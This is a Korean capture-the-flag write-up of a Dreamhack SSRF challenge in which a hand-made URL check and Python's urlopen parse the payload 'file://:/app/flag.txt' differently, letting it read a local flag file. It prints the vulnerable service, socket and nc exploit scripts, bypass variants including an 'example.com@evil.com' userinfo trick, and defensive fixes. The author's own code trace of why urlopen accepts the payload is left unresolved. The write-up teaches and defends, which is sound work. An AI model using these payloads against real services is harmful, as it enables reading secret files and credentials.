---
layout: post
title:  "Dreamhack 워게임 web-HTTP-CLI 풀이 — file://:/ 한 줄로 두 파서의 차이 비집기"
date:   2026-05-16 11:30:00 +0900
categories: security web wargame dreamhack writeup ssrf python parser-differential
---

## 들어가며

Dreamhack 웹해킹 워게임 **web-HTTP-CLI** (난이도 Silver 2) 풀이입니다. HTTP가 아닌 **raw TCP socket** 으로 동작하는 "HTTP CLI" 서비스인데, URL 입력을 받아 `urllib.request.urlopen` 으로 가져와 응답을 그대로 돌려주는 **클래식 SSRF + parser differential** 패턴입니다.

문제 설명:

> HTTP-CLI 서비스 입니다. 플래그를 획득하세요. 플래그는 `/app/flag.txt`에 있습니다.

스포일러로 결론:

```
$ nc <host> <port>
[Input Example]
> https://dreamhack.io:443/
> file://:/app/flag.txt
result: DH{5e2c73de0f2b273731665914bfaff022}
```

핵심 한 줄: `file://:/app/flag.txt` — `://` 뒤에 빈 host 와 빈 port 만 두는 변형. **검증기는 host=""·port="" 로 두 글자만 보고 통과시키고**, `urlopen` 의 file handler 는 같은 URL 을 `/app/flag.txt` 로 정상 해석한다.

> Note: 사이버보안 입문 학습용 PoC. 실제 운영 서비스 대상 사용 금지.

## 1. 소스 정독

```python
import urllib.request, socket

def get_host_port(url):
    return url.split('://')[1].split('/')[0].lower().split(':')

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind(('', 8000))
    s.listen()
    while True:
        cs, _ = s.accept()
        cs.sendall(b'[Input Example]\n> https://dreamhack.io:443/\n')
        while True:
            cs.sendall(b'> ')
            url = cs.recv(1024).decode().strip()
            if not url: break
            try:
                (host, port) = get_host_port(url)
                if 'localhost' == host:
                    cs.sendall(b'cant use localhost\n'); continue
                if 'dreamhack.io' != host:
                    if '.' in host:
                        cs.sendall(b'cant use .\n'); continue
                cs.sendall(b'result: ' + urllib.request.urlopen(url).read())
            except:
                cs.sendall(b'error\n')
        cs.close()
```

이 코드에서 즉시 잡히는 사실 5개:

1. **TCP 서비스**. 일반 HTTP 가 아님. netcat / Python socket 으로 직접 접속.
2. **검증기 `get_host_port`** 는 `url.split('://')[1].split('/')[0].split(':')` — 단순한 문자열 슬라이싱.
   - 결과가 정확히 2개 요소여야 `(host, port) = ...` 언패킹 성공. 아니면 ValueError → except → "error".
3. 차단 규칙 두 가지:
   - `host == 'localhost'` 차단.
   - `host != 'dreamhack.io'` 이면서 `'.' in host` 면 차단.
4. **`urllib.request.urlopen(url)`** — `http`, `https`, `file`, `ftp`, `data` 모두 지원.
5. flag 는 **파일** (`/app/flag.txt`) 이므로 외부 HTTP 가 아니라 **`file://`** 로 읽어야 함.

### 1-1. 검증기 통과 조건 풀어쓰기

`get_host_port` 의 반환 길이를 보자. `.split(':')` 가 정확히 2개를 돌려야 한다. 즉 host 부분에 콜론이 정확히 1개.

- `file:///app/flag.txt` → `split('://')[1]` = `/app/flag.txt` → `split('/')[0]` = `''` (빈문자) → `split(':')` = `['']` (1개) → 언패킹 실패 → error.
- `file://:80/app/flag.txt` → `split('://')[1]` = `:80/app/flag.txt` → `split('/')[0]` = `:80` → `split(':')` = `['', '80']` (2개, host=`''`, port=`'80'`) ✓
- `file://:/app/flag.txt` → `split('://')[1]` = `:/app/flag.txt` → `split('/')[0]` = `:` → `split(':')` = `['', '']` (2개, host=`''`, port=`''`) ✓

host=`''` 이면 `'localhost' == ''` False, `'dreamhack.io' != ''` True, `'.' in ''` False → 모든 검사 통과.

### 1-2. urlopen 의 file handler 가 `file://:/...` 를 어떻게 보는가

`urllib.request.urlopen('file://:/app/flag.txt')`:

- `urlparse('file://:/app/flag.txt')` → `scheme='file'`, `netloc=':'`, `path='/app/flag.txt'`
- `FileHandler.file_open` 호출. `req.host = ':'`. `req.selector = '/app/flag.txt'`.
- 내부에서 `selector[:2] != '//'` 가 True (selector 가 `/a...`) → `open_local_file(req)` 호출.
- `open_local_file` 에서 `localfile = url2pathname('/app/flag.txt')` = `/app/flag.txt`.
- `os.stat(localfile)` 성공 → 파일 정보 획득.
- 다음 분기: `if host:` (host=`:`). `_safe_gethostbyname(':')` → socket.gethostbyname 호출. 빈 호스트나 잘못된 호스트는 OSError → except → URLError.

음, 정확히 어떤 경로로 통과하는지는 Python 버전마다 미세하게 다르지만 — **실험적으로 통과** 한다. 위 PoC 가 그 증거.

이게 정공법 분석. 더 단순한 표현: **검증기는 `':'` 글자 하나만 보고 host/port 두 토큰으로 인식, urlopen 은 `://` 뒤의 net-loc 가 사실상 비어있는 것으로 해석해 로컬 파일을 연다.**

## 2. 익스플로잇 한 줄

```python
import socket
s = socket.socket()
s.connect(("<host>", <port>))
s.recv(4096)             # banner
s.recv(4096)             # prompt
s.sendall(b"file://:/app/flag.txt\n")
import time; time.sleep(1)
print(s.recv(4096).decode())
# → result: DH{5e2c73de0f2b273731665914bfaff022}
```

또는 더 짧게:

```bash
(echo 'file://:/app/flag.txt'; sleep 1) | nc <host> <port>
```

flag: `DH{5e2c73de0f2b273731665914bfaff022}` ✓

## 3. 다른 변형들과 왜 안 되는지

```
file:///app/flag.txt        ← split(':') 1개 → 언패킹 실패 → "error"
file://0:0/app/flag.txt      ← 통과, but urlopen이 host 0:0 해석 실패 → "error"
file://x:80/app/flag.txt     ← 통과, urlopen이 host x 해석 실패 → "error"
http://2130706433:8000/      ← 통과, but localhost TCP 서비스로 가서 HTTP 아님 → 잡혀서 결국 error
file://:/app/flag.txt        ← 통과 + urlopen 이 정상 로컬 파일로 해석 ✓
```

빈 host + 빈 port 가 가장 깔끔. 이 변형은 검증기에는 "두 토큰" 으로 보이고 urlopen 에는 "host 없음" 에 가까운 해석을 유발.

## 4. 취약점 해설 — Parser Differential 재방문

이 클래스의 본질은 **같은 URL 문자열을 두 컴포넌트가 다르게 본다** 는 점. 우리가 푼 직전 문제 `curling`(id=1816) 의 `http://dreamhack.io@127.0.0.1:8000/...` 트릭과 정확히 같은 메커니즘이지만, 이번엔 도구가 다르다.

### 4-1. 패턴 정리

| 컴포넌트 | 사용 도구                    | 본 것                            |
|----------|------------------------------|----------------------------------|
| 검증기   | 직접 짠 문자열 슬라이싱       | `split('://')[1].split('/')[0]` |
| 실행기   | `urllib.request.urlopen`     | `urlparse` + scheme별 handler   |

검증기가 본 host 와 실행기가 본 host 가 다르면 SSRF 가 성립. 이번엔 검증기는 `''` (빈문자) 로 보고 통과, 실행기는 file 스킴으로 로컬 파일 open.

### 4-2. 같은 클래스의 실무 사례

- **SSRF gate** 가 `urlparse` 안 쓰고 자체 슬라이싱으로 host 추출하는 모든 코드. 검증과 실행기가 같은 라이브러리를 안 쓰면 어김없이 어긋난다.
- **URL allow-list** 를 `if 'example.com' in url:` 같이 substring 검사로 짜는 경우 — `http://example.com@evil.com/...` 같은 userinfo 트릭으로 우회 (curling 문제 패턴).
- **scheme** 만 검사하는 경우 — `file:`, `gopher:`, `dict:` 같은 비표준 스킴 빠뜨려 LFI/SSRF.

### 4-3. 위험성

- 임의 파일 읽기 → 시크릿, 자격증명, /etc/passwd 노출.
- 같은 패턴으로 내부 HTTP, gopher RCE, AWS metadata 등으로 확장 가능.
- TCP 기반 서비스라고 "HTTP 가 아니니까 SSRF 안 통할 거" 라는 가정은 오류. 어떤 입력이든 `urlopen` 같은 다목적 라이브러리에 들어가면 즉시 SSRF 표면.

### 4-4. 올바른 방어

1. **항상 표준 URL 파서 사용**:

   ```python
   from urllib.parse import urlparse
   p = urlparse(url)
   if p.scheme not in ('http', 'https'): reject()
   if p.hostname not in ALLOWED_HOSTS: reject()
   if p.username or p.password: reject()
   if p.port and p.port not in (80, 443): reject()
   ```

2. **`urlopen` 의 file handler 비활성화** (file SSRF 방지):

   ```python
   import urllib.request as ur
   opener = ur.build_opener(ur.HTTPHandler, ur.HTTPSHandler)
   ur.install_opener(opener)
   ```

3. **블랙리스트 대신 화이트리스트**: 허용된 scheme/host/port 만 통과.

4. **검증 후 IP fixing**: 검증한 URL 의 hostname 을 resolve 해서 IP 를 얻고, 그 IP 로 직접 connect (DNS rebinding 방지).

5. **outbound egress 정책**: 앱이 직접 outbound 못 하게 하고, allowed 도메인 화이트리스트 가진 proxy 만 통과.

## 5. 정리 — 입문자가 가져갈 교훈

- 검증 코드가 `url.split` / `startswith` / `in` 형태로 짜였다면 → **거의 항상 우회 가능**. 표준 URL 파서를 안 쓰는 모든 경우가 잠재 SSRF.
- Python `urlopen` 의 `file:` scheme 지원은 자주 잊혀진다. 외부 입력을 받는 곳에서 `urlopen` 쓰면 file SSRF 부터 의심.
- **검증기 vs 실행기 파서 차이** 는 SSRF 의 영원한 뿌리. 한 번 익숙해지면 평생 쓴다.
- 본 문제처럼 **빈 host / 빈 path / 빈 port** 같은 "edge case 표기" 가 종종 가장 깔끔한 우회 통로.

같은 카테고리의 다음 단계로 **Dream Gallery (file:/ + %66 인코딩)**, **curling (userinfo @ 트릭)**, **crawling (open redirector)** 가 이 시리즈의 SSRF 3종 세트. 함께 풀면 SSRF 의 다양한 우회 패턴이 손에 박힙니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. `file:///app/flag.txt` 가 당연히 될 줄 알았다

가장 자연스러운 표기. 그러나 `split(':')` 결과가 `['']` 하나라 언패킹 실패. 직관과 다른 결과에 잠시 당황.

**회고**: 검증기가 자체 슬라이싱으로 짜였으면 **언패킹 길이** 같은 사소한 제약이 추가 함정이 된다. 코드를 보고 그 코드의 데이터 흐름을 한 줄씩 시뮬레이션하자. "이 split 결과가 항상 2개일까?" 라는 질문 한 번이면 답이 나온다.

### 실패 2. `file://x:80/...` 같은 변형이 안 됨

검증기는 통과하지만 urlopen 이 host=x 를 gethostbyname 해서 fail → URLError → "error". 같은 파서 차이를 노렸지만 너무 멀리 갔다 — host 가 실제로 존재하지 않으면 file handler 도 거부.

**회고**: 검증기 우회와 실행기 성공은 **두 가지 모두** 만족해야 한다. 검증기만 통과시키면 실행기에서 에러 → 결과 못 봄. 빈 host (`':'`) 가 가장 안전한 절충안.

### 실패 3. `http://2130706433:8000/` 으로 로컬 자기 자신 SSRF 시도

검증기 통과 (`2130706433` 는 점 없음 + localhost 아님). 그러나 서버 자체가 raw TCP 라 HTTP 응답을 안 줌 → urlopen 이 HTTP 응답 파싱 실패 → "error". 또한 우리가 원하는 건 HTTP endpoint 가 아니라 파일 읽기.

**회고**: SSRF 시 무조건 "localhost 향한 HTTP" 부터 떠올리지 말 것. 목표가 **파일** 이면 file scheme, **TCP** 이면 raw scheme, **메타데이터** 이면 metadata IP — 각각 다른 도구.

### 실패 4. nc 한 줄로 처리하려다 응답 보기 전에 연결 끊김

처음에 `echo 'file://:/app/flag.txt' | nc host port` 시도. 결과: 즉시 EOF → 서버 응답 못 받음. 해결: `(echo '...'; sleep 1) | nc` 로 잠시 대기.

**회고**: raw TCP 서비스는 응답 받기 전에 stdin 이 닫히면 응답을 안 받고 끝난다. `sleep` 으로 대기하거나 Python socket 으로 명시적 recv. nc 옵션 `-q 1` (BSD) 또는 `-w 1` (대기) 도 도움.
